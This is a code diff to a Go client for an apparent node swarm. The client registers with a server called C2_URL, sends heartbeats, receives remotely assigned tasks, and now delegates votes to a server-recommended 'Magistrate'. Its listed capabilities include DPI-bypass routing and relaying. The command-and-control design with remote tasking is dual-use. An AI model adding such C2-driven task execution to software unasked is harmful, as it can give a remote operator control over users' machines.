@@ -29,6 +29,7 @@ type RegisterRequest struct {
 	RamMB        int      `json:"ram_mb"`
 	CpuCores     int      `json:"cpu_cores"`
 	PowerRating  string   `json:"power_rating"`
+	DelegatedTo  string   `json:"delegatedTo,omitempty"`
 }
 
 type RegisterResponse struct {
@@ -57,9 +58,11 @@ type Task struct {
 }
 
 type HeartbeatResponse struct {
-	Status     string  `json:"status"`
-	Task       *Task   `json:"task"`
-	TrustScore float64 `json:"trust_score"`
+	Status        string  `json:"status"`
+	Task          *Task   `json:"task"`
+	TrustScore    float64 `json:"trust_score"`
+	IsMagistrate  bool    `json:"is_magistrate"`
+	PowDifficulty int     `json:"pow_difficulty"`
 }
 
 type TaskCompleteRequest struct {
@@ -80,6 +83,8 @@ var (
 	proxyEnabled = true
 	swarmPublicKey = "swarm-master-public-key-placeholder"
 	trustScore     = 50.0 // Initial trust score
+	isMagistrate   = false
+	powDifficulty  = 4
 	isLeader       = false
 	localLeader    = ""
 	stats          = struct {
@@ -191,11 +196,26 @@ func matrixListenerLoop() {
 }
 
 func registerWithC2() {
+	// Auto-Delegation: Fetch recommended Magistrates
+	var delegatedTo string
+	respRec, err := http.Get(C2_URL + "/api/v1/swarm/recommendations/magistrates")
+	if err == nil {
+		defer respRec.Body.Close()
+		var recs []struct {
+			ID string `json:"id"`
+		}
+		if err := json.NewDecoder(respRec.Body).Decode(&recs); err == nil && len(recs) > 0 {
+			delegatedTo = recs[0].ID
+			log.Printf("[E.S.C.A.P.E.] Auto-delegating vote to Magistrate: %s", delegatedTo)
+		}
+	}
+
 	reqData := RegisterRequest{
 		Capabilities: []string{"relay", "byedpi_routing", "matrix_echo"},
 		RamMB:        4096,
 		CpuCores:     4,
 		PowerRating:  "slm_capable",
+		DelegatedTo:  delegatedTo,
 	}
 
 	jsonData, _ := json.Marshal(reqData)
@@ -233,6 +253,10 @@ func heartbeatLoop() {
 		var hbResp HeartbeatResponse
 		json.NewDecoder(resp.Body).Decode(&hbResp)
 		resp.Body.Close()
+
+		trustScore = hbResp.TrustScore
+		isMagistrate = hbResp.IsMagistrate
+		powDifficulty = hbResp.PowDifficulty
 
 		if hbResp.Task != nil {
 			go handleTask(hbResp.Task)
